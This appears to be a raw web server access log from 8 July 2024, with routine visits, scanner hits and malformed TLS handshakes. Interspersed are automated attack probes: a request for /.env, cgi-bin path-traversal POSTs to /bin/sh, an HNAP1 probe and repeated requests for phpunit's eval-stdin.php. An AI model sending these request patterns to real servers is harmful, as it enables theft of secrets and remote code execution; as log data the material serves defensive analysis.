141.98.83.197 - - [08/Jul/2024:18:32:55 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.179 - - [08/Jul/2024:18:35:01 +0000] "GET /.env HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.179 - - [08/Jul/2024:18:35:01 +0000] "\x16\x03\x01\x00\xDE\x01\x00\x00\xDA\x03\x03$\xADO\xFB\xB6\xE8\x14k\xB2\x07Np\xAD\xAE&`\x96\xEDu\xCF?_(\xE3@\x9DB\x89 \x04\xE1\xE2\x00\x00n\xC00\xC0,\xC02\xC0.\xC0/\xC0+\xC01\xC0-\x00\xA5\x00\xA3\x00\xA1\x00\x9F\x00\xA4\x00\xA2\x00\xA0\x00\x9E\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
141.98.83.197 - - [08/Jul/2024:19:30:21 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [08/Jul/2024:19:58:02 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.249.48.202 - - [08/Jul/2024:20:35:30 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [08/Jul/2024:20:39:48 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.207 - - [08/Jul/2024:20:49:50 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xF8\x99{\xA4\xA6\x92\x0EoI\xD4\x94\xA3}\xAAS\xD3\x94o\xCC\xD3XW\xC5\x8EV\x02\xED\x14]\xCB~\xDF\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
205.210.31.207 - - [08/Jul/2024:20:49:50 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB1\x04\xF4&\x9F" 400 154 "-" "-"
185.224.128.43 - - [08/Jul/2024:20:54:47 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
109.205.213.198 - - [08/Jul/2024:20:55:12 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World"
35.233.155.133 - - [08/Jul/2024:21:10:11 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
35.233.155.133 - - [08/Jul/2024:21:10:12 +0000] "GET /favicon.ico HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
141.98.83.197 - - [08/Jul/2024:21:42:38 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [08/Jul/2024:22:16:53 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
41.78.74.32 - - [08/Jul/2024:22:22:53 +0000] "GET / HTTP/1.1" 200 2659 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
45.55.112.20 - - [08/Jul/2024:22:22:53 +0000] "GET / HTTP/1.1" 200 1054 "103.179.33.152" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
167.94.145.106 - - [08/Jul/2024:22:37:39 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
167.94.145.106 - - [08/Jul/2024:22:37:42 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.106 - - [08/Jul/2024:22:37:43 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
167.94.145.106 - - [08/Jul/2024:22:37:43 +0000] "GET /favicon.ico HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
179.43.161.135 - - [08/Jul/2024:22:53:48 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
59.99.203.31 - - [08/Jul/2024:23:08:40 +0000] "POST /HNAP1/ HTTP/1.0" 405 154 "-" "-"
103.173.227.187 - - [08/Jul/2024:23:24:01 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
103.173.227.187 - - [08/Jul/2024:23:24:02 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 154 "-" "-"
103.173.227.187 - - [08/Jul/2024:23:24:02 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
103.173.227.187 - - [08/Jul/2024:23:24:04 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
103.173.227.187 - - [08/Jul/2024:23:24:04 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
103.173.227.187 - - [08/Jul/2024:23:24:05 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
103.173.227.187 - - [08/Jul/2024:23:24:06 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
103.173.227.187 - - [08/Jul/2024:23:24:07 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
103.173.227.187 - - [08/Jul/2024:23:24:08 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
103.173.227.187 - - [08/Jul/2024:23:24:09 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
103.173.227.187 - - [08/Jul/2024:23:24:10 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
103.173.227.187 - - [08/Jul/2024:23:24:11 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
103.173.227.187 - - [08/Jul/2024:23:24:12 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
